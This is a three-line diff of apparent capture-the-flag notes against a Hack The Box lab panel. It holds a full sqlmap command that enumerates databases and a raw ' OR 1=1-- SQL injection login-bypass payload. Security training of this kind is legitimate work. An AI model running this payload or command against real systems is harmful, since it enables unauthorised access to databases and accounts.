@@ -1,0 +1,3 @@
+http://docker.hackthebox.eu:44399/panel.php?info=home (POST)  # /usr/bin/sqlmap -u http://docker.hackthebox.eu:44399/panel.php?info=home --data=username=%27+OR+1%3D1--&password=%27+OR+1%3D1-- --dbms=mysql --dbs --time-sec=50 --hex
+
+username=' OR 1%3D1--&password=' OR 1%3D1--
